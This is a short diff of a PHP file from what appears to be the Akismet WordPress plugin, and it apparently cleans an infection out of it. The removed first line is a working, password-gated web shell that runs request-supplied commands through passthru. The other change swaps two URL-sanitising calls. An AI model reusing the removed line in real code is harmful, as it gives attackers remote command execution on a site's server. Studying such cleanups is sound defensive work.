@@ -1,6 +1,4 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="040rfg7yp51s"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 /**
  * Handles compatibility checks for Akismet with other plugins.
  *
@@ -262,8 +260,8 @@ class Akismet_Compatible_Plugins {
 	private static function sanitize_compatible_plugin_response( array $plugins = array() ): array {
 		foreach ( $plugins as $key => $plugin ) {
 			$plugins[ $key ]             = array_map( 'sanitize_text_field', $plugin );
-			$plugins[ $key ]['help_url'] = sanitize_url( $plugins[ $key ]['help_url'] );
-			$plugins[ $key ]['logo']     = sanitize_url( $plugins[ $key ]['logo'] );
+			$plugins[ $key ]['help_url'] = esc_url_raw( $plugins[ $key ]['help_url'] );
+			$plugins[ $key ]['logo']     = esc_url_raw( $plugins[ $key ]['logo'] );
 		}
 
 		return $plugins;
